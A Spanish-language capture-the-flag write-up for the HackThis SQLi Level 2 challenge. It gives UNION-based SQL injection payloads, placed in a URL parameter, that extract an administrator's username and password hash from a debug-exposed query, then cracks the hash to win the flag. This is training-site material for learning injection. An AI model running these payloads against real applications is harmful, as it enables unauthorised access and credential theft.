#HackThis - SQLi -  Level 2

URL:      https://www.hackthis.co.uk/levels/sqli/2

##Write Up Iker

Para jugar a este juego es necesario registrarse, así que nos registramos y accedemos a la página para empezar los retos.

##Hint

```html
Gain access to an administrators account
```

## Explicación

En este reto de SQLi, tenemos que acceder al sistema con una cuenta de administrador.

Accedemos a la página y vemos que tenemos dos campos de texto donde tenemos que meter el **usuario** y la **contraseña**.

Además de esto, tenemos un enlace a una página donde nos dejan ver los usuarios del sistema haciendo consultas por la primera inicial del nombre.

Probamos diferentes letras:

```html
Asgard
Arruin
Agbrand
Alimism
Aytarra
Amerr
...
```

Probamos diferentes combinaciones y obtenemos los nombres de los usuarios, pero ni rastro de si son usuarios **rasos** o **administradores**.

Tampoco nos muestran las contraseñas como el lógico...todavía :sunglasses:

Nos fijamos en la URL y vemos que se realiza un query con las letras que vamos seleccionando en el menu de abajo

```html
https://www.hackthis.co.uk/levels/sqli/2?browse&q=a
```

Como es una prueba de SQL Injection, probamos a poner una comilla simple ** ' ** y ver que pasa.

```html
DEBUG: SELECT username, admin FROM members WHERE username LIKE 'a'%'
```

¡BINGO! Un mensaje en el navegador con el resultado del **DEBUG**

Ahora que ya sabemos como realiza las consultas, tenemos que montar una que nos de quien es el **Administrador** 

Como con una consulta no sería posible, tenemos que utilizar la consulta **UNION** para hacerlo:

```sql
' UNION ALL SELECT username, password FROM members WHERE admin=1--
```

Montamos la consulta anterior en la URL quedando así:

```html
https://www.hackthis.co.uk/levels/sqli/2?browse&q=a' UNION ALL SELECT username, password FROM members WHERE admin=1--
```

Haciendo eso nos sale el nombre de un usuario, que probablemente sea nuestro administrador :smile:

**bellamond**

**¡OK!** Ya tenemos al usuario administrador pero no sabemos cual es su contraseña.

Al igual que en apartado anterior,  montaremos una consulta para que nos devuelva la contraseña asignada al usuario **bellamond**

```sql
' UNION ALL SELECT password, 2 FROM members WHERE username='bellamond'--
```

Utilizamos dos campos (password, 2) ya que tiene dos campos y sino nos daría un error.

```html
https://www.hackthis.co.uk/levels/sqli/2?browse&q=a' UNION ALL SELECT password, 2 FROM members WHERE username='bellamond'--
```

¡OLE! Nos sale un código muy largo que probablemente sea el **HASH** de la contraseña

**1b774bc166f3f8918e900fcef8752817bae76a37**

Buscamos el **HASH** en **Google** y nos aparece que es el siguiente:

```html
1b774bc166f3f8918e900fcef8752817bae76a37  :  sup3r
```

Ya tenemos los dos datos para pasar la prueba. Lo probamos y efectivamente la pasamos :smile: :beers:

```html
Usuario  : bellamont
Password : sup3r
```

**FLAG** = {bellamond/sup3r}
